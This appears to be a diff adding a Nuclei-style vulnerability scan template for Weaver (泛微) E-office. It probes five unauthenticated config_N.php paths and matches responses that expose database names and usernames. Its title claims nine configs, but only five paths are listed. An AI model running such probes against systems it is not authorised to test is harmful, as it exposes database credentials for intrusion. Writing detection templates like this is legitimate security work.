@@ -1,0 +1,31 @@
+id: weaver-eoffice-mobileurl-config2php-unauth
+info:
+  name: 泛微 E-office mobileurl config_1 to config_9 - disclosure
+  author: leadlife
+  severity: high
+  description: 泛微e-office是一种企业办公自动化软件解决方案，由中国的泛微网络科技股份有限公司开发和提供。它旨在帮助企业提高办公效率、优化业务流程和信息管理。泛微e-office
+    存在未授权访问，攻击者可以访问页面获取敏感信息。
+  reference: 
+    - https://wiki.wy876.cn/#/%E6%B3%9B%E5%BE%AEe-office_%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE
+  metadata:
+    verified: true
+    fofa-query: app="test"
+  tags: weaver,unauth,eoffice,oa
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/building/backmgr/urlpage/mobileurl/config_1.php"
+      - "{{BaseURL}}/building/backmgr/urlpage/mobileurl/config_2.php"
+      - "{{BaseURL}}/building/backmgr/urlpage/mobileurl/config_3.php"
+      - "{{BaseURL}}/building/backmgr/urlpage/mobileurl/config_4.php"
+      - "{{BaseURL}}/building/backmgr/urlpage/mobileurl/config_5.php"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'数据库名','用户名')
+        condition: and
